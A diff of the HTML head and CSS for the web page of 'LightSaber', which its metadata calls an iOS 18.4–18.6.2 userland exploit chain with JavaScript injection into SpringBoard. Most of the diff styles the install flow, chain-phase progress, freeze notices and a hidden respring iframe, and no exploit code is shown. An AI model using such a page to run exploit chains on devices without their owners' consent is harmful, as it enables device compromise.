@@ -3,34 +3,34 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BrokenBlade</title>
-  <meta name="description" content="iOS 18.4-18.6.2 userland exploit chain with JavaScript injection that modifies SpringBoard and other processes at runtime. Experimental fork of LightSaber.">
+  <title>LightSaber</title>
+  <meta name="description" content="iOS 18.4-18.6.2 userland exploit chain with JavaScript injection that modifies SpringBoard and other processes at runtime. Open source, derived from DarkSword.">
   <meta property="og:type" content="website">
-  <meta property="og:site_name" content="BrokenBlade">
-  <meta property="og:title" content="BrokenBlade - iOS 18.4-18.6.2 research tool">
-  <meta property="og:description" content="iOS userland exploit chain with JavaScript injection that modifies SpringBoard and other processes at runtime. Experimental fork of LightSaber.">
-  <meta property="og:url" content="https://zeroxjf.github.io/BrokenBlade/">
-  <meta property="og:image" content="https://zeroxjf.github.io/BrokenBlade/icons/brokenblade-logo.png">
-  <meta property="og:image:width" content="1024">
+  <meta property="og:site_name" content="LightSaber">
+  <meta property="og:title" content="LightSaber - iOS 18.4-18.6.2 research tool">
+  <meta property="og:description" content="iOS userland exploit chain with JavaScript injection that modifies SpringBoard and other processes at runtime. Open source, derived from DarkSword.">
+  <meta property="og:url" content="https://zeroxjf.github.io/lightsaber/">
+  <meta property="og:image" content="https://zeroxjf.github.io/lightsaber/icons/lightsaber-logo.png">
+  <meta property="og:image:width" content="1536">
   <meta property="og:image:height" content="1024">
-  <meta property="og:image:alt" content="BrokenBlade logo - broken sword">
+  <meta property="og:image:alt" content="LightSaber logo - blue lightsaber with the LightSaber wordmark">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:site" content="@zeroxjf">
   <meta name="twitter:creator" content="@zeroxjf">
-  <meta name="twitter:title" content="BrokenBlade - iOS 18.4-18.6.2 research tool">
-  <meta name="twitter:description" content="iOS userland exploit chain with JavaScript injection that modifies SpringBoard and other processes at runtime. Experimental fork of LightSaber.">
-  <meta name="twitter:image" content="https://zeroxjf.github.io/BrokenBlade/icons/brokenblade-logo.png">
-  <meta name="twitter:image:alt" content="BrokenBlade logo - broken sword">
-  <link rel="icon" type="image/png" href="icons/brokenblade-logo.png">
-  <link rel="apple-touch-icon" href="icons/brokenblade-logo.png">
+  <meta name="twitter:title" content="LightSaber - iOS 18.4-18.6.2 research tool">
+  <meta name="twitter:description" content="iOS userland exploit chain with JavaScript injection that modifies SpringBoard and other processes at runtime. Open source, derived from DarkSword.">
+  <meta name="twitter:image" content="https://zeroxjf.github.io/lightsaber/icons/lightsaber-logo.png">
+  <meta name="twitter:image:alt" content="LightSaber logo - blue lightsaber with the LightSaber wordmark">
+  <link rel="icon" type="image/png" href="icons/lightsaber-logo.png">
+  <link rel="apple-touch-icon" href="icons/lightsaber-logo.png">
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');
     :root {
       /* Sileo-inspired light palette: pale blue-gray canvas, pure white
          surfaces, sharp system blue accent. Not a carbon copy - softer
          shadows, more breathing room, consistent 14-18px corner radii. */
-      --bg:         #f5f2ea;
-      --bg-grad:    radial-gradient(1200px 700px at 50% -220px, rgba(202,138,4,0.12), transparent 62%);
+      --bg:         #eef0f5;
+      --bg-grad:    radial-gradient(1200px 700px at 50% -220px, rgba(45,169,255,0.12), transparent 62%);
       --card:       #ffffff;
       --card-alt:   #f7f8fb;
       --card-inset: #f0f2f6;
@@ -52,9 +52,6 @@
       --accent-dark:   #0b66a8;
       --accent-soft:   #e6f4ff;
       --accent-border: #b7dcff;
-      --version-marker: #ca8a04;
-      --build-banner: #92400e;
-      --build-banner-link: #fef3c7;
       --hover:    #f0f2f6;
       --code-bg:  #f0f2f6;
       --ease:     cubic-bezier(0.22, 0.61, 0.36, 1);
@@ -78,24 +75,6 @@
       -webkit-font-smoothing: antialiased;
       -moz-osx-font-smoothing: grayscale;
       text-rendering: optimizeLegibility;
-    }
-    .build-warning-banner {
-      background: var(--build-banner);
-      color: #fff;
-      text-align: center;
-      padding: 12px 16px 13px;
-      font-family: var(--mono);
-      font-size: clamp(28px, 9vw, 52px);
-      font-weight: 800;
-      line-height: 1;
-      letter-spacing: 0;
-      position: sticky;
-      top: 0;
-      z-index: 99999;
-    }
-    .build-warning-banner time {
-      display: block;
-      color: #fff;
     }
     a { color: var(--accent-hover); text-decoration: none; transition: color 0.15s var(--ease); }
     a:hover { color: var(--accent-dark); }
@@ -123,8 +102,8 @@
       box-shadow: inset 0 1px 0 rgba(255,255,255,0.9);
     }
     .page-header {
-      margin-bottom: 18px;
-      padding-bottom: 16px;
+      margin-bottom: 12px;
+      padding-bottom: 10px;
       border-bottom: 1px solid var(--border-soft);
     }
     .page-title {
@@ -226,6 +205,19 @@
       border-color: var(--accent-hover);
       box-shadow: 0 2px 4px rgba(10,15,28,0.08), 0 14px 30px -8px rgba(45,169,255,0.65);
     }
+    .btn-clear-queue {
+      background: none;
+      border: none;
+      color: var(--subtle);
+      font-family: inherit;
+      font-size: 0.78rem;
+      font-weight: 600;
+      padding: 8px 14px;
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+      margin-top: 6px;
+    }
+    .btn-clear-queue:active { opacity: 0.5; }
     .btn-disabled {
       background: var(--card-inset);
       color: var(--faint);
@@ -247,8 +239,17 @@
     }
     .install-zone {
       display: flex;
-      justify-content: center;
+      flex-direction: column;
+      align-items: center;
       margin: 18px 0;
+    }
+    .install-secondary-actions {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 8px;
     }
     .install-status {
       font-size: 13px;
@@ -262,51 +263,169 @@
       margin: -6px auto 12px;
     }
     .install-status.error { color: #dc2626; }
-    .tip {
+    /* Running state — stands up the "Running chain (~1 min)" line as the
+       primary attention anchor while the chain works. Pulsing dot, bold
+       title in accent ink, muted subtitle for the freeze caveat. */
+    .install-status.running {
       display: flex;
-      align-items: flex-start;
-      gap: 10px;
+      align-items: center;
+      gap: 12px;
+      text-align: left;
       background: var(--accent-soft);
       border: 1px solid var(--accent-border);
-      border-radius: 14px;
-      padding: 12px 14px;
-      margin-top: 0;
-      font-size: 0.76rem;
-      line-height: 1.55;
+      padding: 11px 14px;
+      border-radius: 12px;
       color: var(--accent-dark);
       box-shadow: var(--shadow-sm);
-      animation: tipPulse 3.2s ease-in-out infinite;
     }
-    .tip-icon {
-      flex: 0 0 20px;
-      width: 20px;
-      height: 20px;
+    .install-status-dot {
+      flex: 0 0 10px;
+      width: 10px;
+      height: 10px;
       border-radius: 50%;
       background: var(--accent);
-      color: #fff;
-      font-weight: 700;
-      font-size: 12px;
-      font-family: var(--mono);
+      animation: statusPulse 1.3s ease-in-out infinite;
+    }
+    .install-status-body { flex: 1; min-width: 0; }
+    .install-status-title {
+      display: block;
+      font-size: 0.95rem;
+      font-weight: 800;
+      color: var(--accent-dark);
+      letter-spacing: -0.01em;
+      line-height: 1.25;
+    }
+    .install-status-meta {
+      display: block;
+      font-size: 0.75rem;
+      font-weight: 500;
+      color: var(--accent-dark);
+      opacity: 0.78;
+      margin-top: 2px;
+      line-height: 1.4;
+    }
+    @keyframes statusPulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50%      { opacity: 0.35; transform: scale(0.8); }
+    }
+    @media (prefers-reduced-motion: reduce) {
+      .install-status-dot { animation: none; }
+    }
+    .btn-respring {
+      background: var(--card);
+      color: var(--muted);
+      border-color: var(--border);
+      padding: 8px 16px;
+      border-radius: 999px;
+      font-size: 0.78rem;
+      box-shadow: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .btn-respring:hover {
+      background: var(--card-alt);
+      color: var(--ink);
+      box-shadow: none;
+    }
+    .btn-respring:disabled {
+      background: var(--card-inset);
+      color: var(--faint);
+      border-color: var(--border-soft);
+      cursor: default;
+      pointer-events: none;
+    }
+    .respring-frame {
+      position: fixed;
+      right: 0;
+      bottom: 0;
+      width: 1px;
+      height: 1px;
+      border: 0;
+      opacity: 0.01;
+      pointer-events: none;
+    }
+    /* Add-to-Home-Screen prompt. Slides up from the bottom with a small bob
+       so it catches attention without blocking the page. iOS-Safari only,
+       skipped when window.navigator.standalone is true (already added).
+       Dismissal is persistent via localStorage so it doesn't re-pester. */
+    .bookmark-prompt {
+      position: fixed;
+      left: 50%;
+      bottom: calc(12px + env(safe-area-inset-bottom, 0px));
+      width: calc(100% - 24px);
+      max-width: 460px;
+      z-index: 90;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: var(--card);
+      border: 1px solid var(--border-strong);
+      border-radius: 16px;
+      padding: 12px 14px;
+      box-shadow: var(--shadow-lg);
+      transform: translateX(-50%) translateY(140%);
+      opacity: 0;
+      pointer-events: none;
+      transition: transform 0.55s var(--ease-out), opacity 0.4s var(--ease);
+    }
+    .bookmark-prompt.visible {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+      pointer-events: auto;
+      animation: bookmarkBob 2.6s ease-in-out 0.6s 2;
+    }
+    @keyframes bookmarkBob {
+      0%, 100% { transform: translateX(-50%) translateY(0); }
+      50%      { transform: translateX(-50%) translateY(-4px); }
+    }
+    @media (prefers-reduced-motion: reduce) {
+      .bookmark-prompt { transition: opacity 0.2s; }
+      .bookmark-prompt.visible { animation: none; }
+    }
+    .bookmark-prompt-icon {
+      flex-shrink: 0;
+      width: 36px;
+      height: 36px;
+      border-radius: 10px;
+      background: var(--accent-soft);
+      color: var(--accent-dark);
       display: flex;
       align-items: center;
       justify-content: center;
-      margin-top: 1px;
-      animation: tipIconBob 2.4s ease-in-out infinite;
     }
-    .tip-body { flex: 1; }
-    .tip-body strong { color: var(--accent-dark); font-weight: 700; }
-    @keyframes tipPulse {
-      0%, 100% { box-shadow: 0 0 0 0 rgba(45, 169, 255, 0.0); }
-      50%      { box-shadow: 0 0 0 6px rgba(45, 169, 255, 0.18); }
+    .bookmark-prompt-icon svg { display: block; }
+    .bookmark-prompt-body { flex: 1; min-width: 0; }
+    .bookmark-prompt-title {
+      font-size: 0.86rem;
+      font-weight: 800;
+      color: var(--ink);
+      letter-spacing: -0.01em;
     }
-    @keyframes tipIconBob {
-      0%, 100% { transform: translateY(0); }
-      50%      { transform: translateY(-2px); }
+    .bookmark-prompt-text {
+      font-size: 0.74rem;
+      color: var(--muted);
+      line-height: 1.4;
+      margin-top: 2px;
     }
-    @media (prefers-reduced-motion: reduce) {
-      .tip, .tip-icon { animation: none; }
+    .bookmark-prompt-text strong { color: var(--ink); font-weight: 700; }
+    .bookmark-prompt-close {
+      flex-shrink: 0;
+      width: 30px;
+      height: 30px;
+      border: none;
+      background: var(--card-alt);
+      color: var(--subtle);
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 1;
+      border-radius: 8px;
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
     }
-    .warning, .disclaimer, .caution {
+    .bookmark-prompt-close:active { background: var(--border); }
+    .warning, .disclaimer, .caution, .debug {
       border-radius: 10px;
       padding: 11px 13px;
       margin-bottom: 12px;
@@ -341,15 +460,24 @@
     }
     .caution strong { color: #4d2806; font-weight: 700; }
     .caution a { color: #7d3d02; text-decoration: underline; }
+    .debug {
+      background: #eaf6ff;
+      border: 1px solid #7dc7ff;
+      color: #155274;
+      box-shadow: 0 1px 2px rgba(0,122,255,0.08), 0 4px 14px -6px rgba(0,122,255,0.22);
+    }
+    .debug strong { color: #0c3954; font-weight: 700; }
+    .debug a { color: #155274; text-decoration: underline; }
     /* Collapsible <details>/<summary> versions of the three warning boxes
        on the page itself. The intro overlay still shows the full text;
        these inline boxes start collapsed and can be tapped to expand. */
-    details.warning, details.disclaimer, details.caution {
+    details.warning, details.disclaimer, details.caution, details.debug {
       cursor: pointer;
     }
     details.warning summary,
     details.disclaimer summary,
-    details.caution summary {
+    details.caution summary,
+    details.debug summary {
       list-style: none;
       display: flex;
       align-items: center;
@@ -359,12 +487,14 @@
     }
     details.warning summary::-webkit-details-marker,
     details.disclaimer summary::-webkit-details-marker,
-    details.caution summary::-webkit-details-marker {
+    details.caution summary::-webkit-details-marker,
+    details.debug summary::-webkit-details-marker {
       display: none;
     }
     details.warning summary::after,
     details.disclaimer summary::after,
-    details.caution summary::after {
+    details.caution summary::after,
+    details.debug summary::after {
       content: "+";
       flex: 0 0 auto;
       font-size: 14px;
@@ -380,12 +510,14 @@
     }
     details[open].warning summary::after,
     details[open].disclaimer summary::after,
-    details[open].caution summary::after {
+    details[open].caution summary::after,
+    details[open].debug summary::after {
       content: "\2212"; /* minus sign */
     }
     details.warning .details-body,
     details.disclaimer .details-body,
-    details.caution .details-body {
+    details.caution .details-body,
+    details.debug .details-body {
       margin-top: 8px;
       padding-top: 8px;
       border-top: 1px dashed currentColor;
@@ -414,7 +546,7 @@
       display: flex;
       flex-wrap: wrap;
       gap: 6px;
-      margin-top: 12px;
+      margin-top: 8px;
       justify-content: center;
     }
     .header-card {
@@ -457,87 +589,384 @@
       display: inline-block;
       vertical-align: middle;
     }
-    #logBox {
+    /* Inline activity log - visible in the page so it cannot cover raw logs. */
+    .log-sheet-backdrop {
       display: none;
-      position: fixed;
-      left: 10px;
-      right: 10px;
-      bottom: max(10px, env(safe-area-inset-bottom));
-      z-index: 40;
-      background: #1a1a1c;
-      border: 1px solid #2c2c2e;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 18px 46px rgba(0,0,0,0.35);
     }
-    #logBox.active { display: block; }
-    #logBox .log-header {
+    .log-sheet-backdrop.active { display: none; }
+    .log-sheet {
+      margin-top: 10px;
+      width: 100%;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      box-shadow: var(--shadow-sm);
+      overflow: hidden;
+      padding: 0;
+      pointer-events: auto;
+      display: flex;
+      flex-direction: column;
+    }
+    .log-sheet.active { display: flex; }
+    @media (prefers-reduced-motion: reduce) {
+      .log-sheet-backdrop { transition: none; }
+      .log-sheet { transition: none; }
+    }
+    .log-sheet-header {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      gap: 8px;
-      padding: 8px 12px;
-      font-size: 11px;
-      font-weight: 600;
-      color: #8e8e93;
-      background: #222224;
-      border-bottom: 1px solid #2c2c2e;
+      gap: 10px;
+      padding: 14px 18px 12px;
+      border-bottom: 1px solid var(--border-soft);
     }
-    .log-actions {
-      display: inline-flex;
-      gap: 6px;
-      flex-shrink: 0;
-    }
-    .log-action {
-      border: 1px solid #3a3a3c;
-      background: #2c2c2e;
-      color: #d1d1d6;
-      border-radius: 7px;
-      padding: 3px 8px;
-      font-size: 10px;
+    .log-sheet-clear {
+      background: var(--card-alt);
+      border: 1px solid var(--border);
+      color: var(--muted);
+      border-radius: 8px;
+      padding: 4px 10px;
+      font-size: 0.66rem;
       font-weight: 700;
-      line-height: 1.2;
+      letter-spacing: 0.02em;
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
     }
-    #logScroll {
-      height: min(260px, 42dvh);
-      overflow-y: scroll;
+    .log-sheet-clear:active { opacity: 0.6; }
+    .log-sheet-header .tweak-sheet-back {
+      background: none;
+      border: none;
+      color: var(--accent);
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 4px 8px 4px 0;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      gap: 3px;
+      font-family: inherit;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .log-sheet-header .tweak-sheet-back:active { opacity: 0.6; }
+    .log-sheet-title {
+      flex: 1;
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: var(--ink);
+      letter-spacing: -0.02em;
+      text-align: left;
+    }
+    /* Stage banner sits in the same card-alt block as the phase strip — no
+       border between them so they read as one cohesive header. The phase
+       strip's pulsing active bar replaces the old standalone status dot. */
+    .log-stage-banner {
+      padding: 10px 16px 4px;
+      background: var(--card-alt);
+    }
+    .log-stage-text {
+      font-size: 0.84rem;
+      font-weight: 700;
+      color: var(--ink);
+      line-height: 1.3;
+      letter-spacing: -0.01em;
+    }
+    .log-stage-banner.done .log-stage-text { color: #0f7a3d; }
+    .log-stage-banner.err  .log-stage-text { color: #c41e1e; }
+    .log-stage-sub {
+      font-size: 0.7rem;
+      font-weight: 500;
+      color: var(--subtle);
+      margin-top: 2px;
+      line-height: 1.4;
+    }
+    .log-sheet-body {
+      overflow-y: auto;
       -webkit-overflow-scrolling: touch;
       overscroll-behavior: contain;
-      padding: 8px 12px;
+      background: var(--card);
+      padding: 6px 18px 12px;
+      max-height: min(240px, 34dvh);
+    }
+    .log-sheet-empty {
+      font-size: 0.78rem;
+      color: var(--subtle);
+      text-align: center;
+      padding: 14px 0;
     }
     .log-line {
+      font-size: 0.76rem;
+      line-height: 1.55;
+      color: var(--muted);
+      padding: 5px 0;
+      border-bottom: 1px solid var(--border-soft);
+      opacity: 0;
+      transform: translateY(6px);
+      animation: logLineIn 0.3s var(--ease-out) forwards;
+    }
+    @keyframes logLineIn {
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .log-line:last-child { border-bottom: none; }
+    .log-line.ok { color: #0f7a3d; }
+    .log-line.err { color: #c41e1e; }
+    .log-line.note { color: #8a5a00; }
+    .log-line.device { color: var(--accent-dark); }
+    /* Chain phase progress strip - five short bars that light up in order so
+       the user always knows where in the chain they are. Sits directly under
+       the stage banner inside the activity log card. */
+    .log-phase-strip {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 6px;
+      padding: 4px 16px 10px;
+      background: var(--card-alt);
+      border-bottom: 1px solid var(--border-soft);
+    }
+    .log-phase {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      text-align: center;
+      min-width: 0;
+    }
+    .log-phase-bar {
+      height: 4px;
+      border-radius: 2px;
+      background: var(--border);
+      transition: background 0.25s var(--ease);
+    }
+    .log-phase-label {
+      font-size: 0.56rem;
+      font-weight: 700;
+      color: var(--faint);
+      letter-spacing: 0.04em;
+      line-height: 1.2;
+      text-transform: uppercase;
+      transition: color 0.2s var(--ease);
+    }
+    .log-phase.active .log-phase-bar {
+      background: var(--accent);
+      animation: phasePulse 1.4s ease-in-out infinite;
+    }
+    .log-phase.active .log-phase-label { color: var(--accent-dark); }
+    .log-phase.done .log-phase-bar { background: #30d158; animation: none; }
+    .log-phase.done .log-phase-label { color: #0f7a3d; }
+    .log-phase.err .log-phase-bar { background: #ff453a; animation: none; }
+    .log-phase.err .log-phase-label { color: #c41e1e; }
+    @keyframes phasePulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+    /* Freeze-imminent treatment. Applied at fcall (the last paint before
+       WebKit hands off to native and the parent main thread freezes with
+       it). Phases 3–5 will run during the freeze and never tick live, so
+       they switch from inert gray to amber + slow opacity pulse — that
+       reads as "queued and running in the background", not "stuck". The
+       active WebKit phase stays its normal blue, since it is the phase
+       actually executing. */
+    .log-phase-strip.is-frozen .log-phase:not(.active):not(.done):not(.err) .log-phase-bar {
+      background: #f59e0b;
+      animation: phaseFreezeWaiting 1.8s ease-in-out infinite;
+    }
+    .log-phase-strip.is-frozen .log-phase:not(.active):not(.done):not(.err) .log-phase-label {
+      color: #b45309;
+    }
+    @keyframes phaseFreezeWaiting {
+      0%, 100% { opacity: 0.95; }
+      50%      { opacity: 0.45; }
+    }
+    /* Stagger the waiting-pulse so the bars don't all blink in unison —
+       reads more like "queue progressing" than "all 3 idle together". */
+    .log-phase-strip.is-frozen .log-phase[data-phase="3"] .log-phase-bar { animation-delay: 0s; }
+    .log-phase-strip.is-frozen .log-phase[data-phase="4"] .log-phase-bar { animation-delay: 0.4s; }
+    .log-phase-strip.is-frozen .log-phase[data-phase="5"] .log-phase-bar { animation-delay: 0.8s; }
+    /* Brackets that wrap the amber phase bars (3–5) directly on the strip.
+       Positioned absolutely so they hug the bars themselves rather than
+       sitting in a row below. Geometry: strip uses 5 equal columns with
+       18px L/R padding and 6px gaps, so phase 3's left edge sits at
+       roughly 40% + 6/W of strip width, and phase 5's right edge sits
+       18px from strip's right edge — close enough across phone widths
+       that the brackets visually cradle the three amber bars. */
+    .log-phase-strip { position: relative; }
+    .frozen-bracket {
+      display: none;
+      position: absolute;
+      top: 1px;
+      width: 7px;
+      height: 14px;
+      border: 1.5px solid #b45309;
+      border-radius: 2px;
+      pointer-events: none;
+      animation: frozenBracketPulse 1.4s ease-in-out infinite;
+    }
+    .log-phase-strip.is-frozen .frozen-bracket { display: block; }
+    .frozen-bracket-l {
+      left: calc(40% - 4px);
+      border-right: none;
+    }
+    .frozen-bracket-r {
+      right: 12px;
+      border-left: none;
+      animation-delay: 0.7s;
+    }
+    @keyframes frozenBracketPulse {
+      0%, 100% { opacity: 1; transform: scaleY(1); }
+      50%      { opacity: 0.45; transform: scaleY(0.78); }
+    }
+    /* Frozen-phase explainer. Appears only while .is-frozen is on the strip,
+       directly below it. Plain centered amber text now that the brackets
+       live on the strip itself. */
+    .log-phase-frozen-note {
+      display: none;
+      padding: 6px 16px 8px;
+      background: rgba(245, 158, 11, 0.08);
+      border-bottom: 1px solid rgba(180, 83, 9, 0.22);
+      font-size: 0.62rem;
+      font-weight: 600;
+      color: #b45309;
+      line-height: 1.4;
+      text-align: center;
+    }
+    .log-phase-strip.is-frozen + .log-phase-frozen-note {
+      display: block;
+      animation: frozenNoteIn 0.45s var(--ease-out);
+    }
+    @keyframes frozenNoteIn {
+      from { opacity: 0; transform: translateY(-3px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    @media (prefers-reduced-motion: reduce) {
+      .log-phase.active .log-phase-bar { animation: none; }
+      .log-phase-strip.is-frozen .log-phase .log-phase-bar { animation: none; }
+      .frozen-bracket { animation: none; }
+      .log-phase-strip.is-frozen + .log-phase-frozen-note { animation: none; }
+    }
+    /* Expected-behavior callout. Hidden by default; pops during freeze /
+       cache-cleanup / Safari-kill phases since those are the counter-intuitive
+       "this looks wrong but means the chain is working" moments. */
+    .log-expected-callout {
+      display: none;
+      align-items: flex-start;
+      gap: 9px;
+      padding: 9px 16px;
+      background: #fff4d6;
+      border-bottom: 1px solid #f5c26b;
+      color: #6f4300;
+      font-size: 0.72rem;
+      line-height: 1.4;
+    }
+    .log-expected-callout.visible { display: flex; }
+    .log-expected-callout .callout-badge {
+      flex-shrink: 0;
+      display: inline-flex;
+      align-items: center;
+      height: 18px;
+      padding: 0 8px;
+      border-radius: 999px;
+      background: #f59e0b;
+      color: #fff;
+      font-size: 0.56rem;
+      font-weight: 800;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+    .log-expected-callout strong { color: #4f2f00; font-weight: 800; }
+    .run-expectations {
+      margin-top: 12px;
+      padding: 12px;
+      background: #fff8e6;
+      border: 1px solid #f5c26b;
+      border-radius: 12px;
+    }
+    .run-expectations.hidden { display: none; }
+    .run-expectations-title {
+      font-size: 0.74rem;
+      font-weight: 800;
+      color: #6f4300;
+      margin-bottom: 8px;
+    }
+    .expectation-list {
+      display: grid;
+      gap: 7px;
+    }
+    .expectation-row {
+      display: grid;
+      grid-template-columns: 22px 1fr;
+      gap: 8px;
+      align-items: start;
+      font-size: 0.68rem;
+      line-height: 1.45;
+      color: #6f4300;
+    }
+    .expectation-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: #f59e0b;
+      color: #fff;
+      font-size: 0.66rem;
+      font-weight: 800;
+      font-family: var(--mono);
+    }
+    .expectation-copy strong {
+      color: #4f2f00;
+      font-weight: 800;
+    }
+    .expectation-row.hit .expectation-badge {
+      background: #30d158;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
+    }
+    .expectation-row.hit { color: #1f4f24; }
+    .expectation-row.hit .expectation-copy strong { color: #0f3a13; }
+    /* The log scroll lives inside .log-sheet now (no standalone box). Dark
+       terminal styling on the scroll itself contrasts with the white card,
+       so the raw stream reads like a console panel embedded in the card. */
+    #rawLogScroll {
+      max-height: min(320px, 44dvh);
+      overflow-y: auto;
+      overscroll-behavior: contain;
+      padding: 8px 12px;
+      background: #1a1a1c;
+      border-top: 1px solid #2c2c2e;
+      /* No GPU-layer or containment hints here. translateZ(0) and
+         contain: paint were tried as a fix for the "blank-on-scroll"
+         bug, but on iOS Safari they let the compositor skip painting
+         off-screen content and made things worse. Plain CPU scrolling
+         re-paints every visible line on scroll, which is what we want. */
+    }
+    .raw-log-empty,
+    .raw-log-line {
       font-family: 'SF Mono', SFMono-Regular, Menlo, Consolas, monospace;
-      font-size: 10.5px;
+      font-size: 0.64rem;
       line-height: 1.5;
       color: #8e8e93;
       white-space: pre-wrap;
-      word-break: break-all;
+      word-break: break-word;
       padding: 1px 0;
     }
-    .log-line.ok { color: #30d158; }
-    .log-line.err { color: #ff453a; }
-    .log-line.device { color: #5ac8fa; }
-    .log-line.kernel { color: #ff9f0a; }
-    .log-line.springboard { color: #bf5af2; }
-    .log-line.pe { color: #30d158; }
+    .raw-log-empty {
+      padding: 12px 0;
+      text-align: center;
+      color: #6f6f75;
+    }
+    .raw-log-line.ok { color: #30d158; }
+    .raw-log-line.err { color: #ff453a; }
+    .raw-log-line.device { color: #5ac8fa; }
+    .raw-log-line.kernel { color: #ff9f0a; }
+    .raw-log-line.springboard { color: #bf5af2; }
+    .raw-log-line.pe { color: #30d158; }
+    .raw-log-line.note { color: #ffd60a; }
     .version {
       font-family: var(--mono);
       font-size: 0.66rem;
       color: var(--faint);
-      margin-top: 16px;
-      letter-spacing: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 7px;
-    }
-    .version::before {
-      content: "";
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: var(--version-marker);
-      box-shadow: 0 0 0 3px color-mix(in srgb, var(--version-marker) 18%, transparent);
+      text-align: center;
+      margin-top: 10px;
+      letter-spacing: 0.04em;
     }
     .overlay {
       display: none;
@@ -638,14 +1067,23 @@
     .tweak-list {
       display: flex;
       flex-direction: column;
-      gap: 12px;
-      margin: 16px 0 10px;
+      gap: 6px;
+      margin: 10px 0 8px;
+    }
+    .tweak-section-label {
+      font-family: var(--mono);
+      font-size: 0.62rem;
+      font-weight: 600;
+      color: var(--faint);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      padding: 6px 4px 2px;
     }
     .tweak-row {
       background: var(--card);
       border: 1px solid var(--border);
-      border-radius: 14px;
-      padding: 14px 16px;
+      border-radius: 10px;
+      padding: 10px 14px;
       box-shadow: var(--shadow-sm);
       transition: background 0.18s var(--ease), border-color 0.18s var(--ease), box-shadow 0.2s var(--ease), transform 0.2s var(--ease-out);
     }
@@ -655,21 +1093,138 @@
       box-shadow: var(--shadow-row);
       transform: translateY(-1px);
     }
-    .tweak-row.experimental {
-      opacity: 0.68;
-      background: var(--card-inset);
+    .tweak-row.is-disabled {
+      background: #f3f4f6;
+      border-color: #e5e7eb;
+      box-shadow: none;
+      filter: grayscale(0.85);
     }
-    .tweak-row.experimental.checked {
-      opacity: 1;
-      background: var(--card-alt);
+    .tweak-row.is-disabled .tweak-row-name,
+    .tweak-row.is-disabled .tweak-row-desc,
+    .tweak-row.is-disabled .tweak-row-notes {
+      color: #9ca3af;
     }
-    .tweak-row.testing {
-      opacity: 0.45;
-      background: var(--card-inset);
+    .tweak-row.is-disabled .tweak-row-name {
+      text-decoration: line-through;
+      text-decoration-color: #cbd1d8;
     }
-    .tweak-row.testing.checked {
-      opacity: 0.7;
-      background: var(--card-alt);
+    .tweak-row.is-disabled .tweak-row-hint {
+      color: #b5bac3;
+    }
+    .tweak-row.is-disabled .tweak-queue-btn {
+      background: #d1d5db;
+      color: #6b7280;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    .tweak-row.is-disabled .tweak-row-info {
+      opacity: 0.6;
+    }
+    /* Tweak detail sheet - slides in from right like Sileo */
+    .tweak-sheet-backdrop {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 900;
+      background: rgba(0,0,0,0.35);
+      opacity: 0;
+      transition: opacity 0.25s var(--ease);
+      -webkit-tap-highlight-color: transparent;
+    }
+    .tweak-sheet-backdrop.active { display: block; opacity: 1; }
+    .tweak-sheet {
+      position: fixed;
+      top: 50%; left: 50%;
+      width: min(88vw, 420px);
+      max-height: 75vh;
+      z-index: 910;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      box-shadow: var(--shadow-lg);
+      transform: translate(-50%, -50%) scale(0.92);
+      opacity: 0;
+      transition: transform 0.25s var(--ease-out), opacity 0.2s var(--ease);
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      padding: 0;
+      pointer-events: none;
+    }
+    .tweak-sheet.active { transform: translate(-50%, -50%) scale(1); opacity: 1; pointer-events: auto; }
+    @media (prefers-reduced-motion: reduce) {
+      .tweak-sheet-backdrop { transition: none; }
+      .tweak-sheet { transition: none; }
+    }
+    .tweak-sheet-header {
+      position: sticky;
+      top: 0;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 14px 18px 12px;
+      background: var(--card);
+      border-bottom: none;
+      border-radius: 18px 18px 0 0;
+    }
+    .tweak-sheet-back {
+      background: none;
+      border: none;
+      color: var(--accent);
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 4px 8px 4px 0;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      gap: 3px;
+      font-family: inherit;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .tweak-sheet-back:active { opacity: 0.6; }
+    .tweak-sheet-title {
+      flex: 1;
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: var(--ink);
+      letter-spacing: -0.02em;
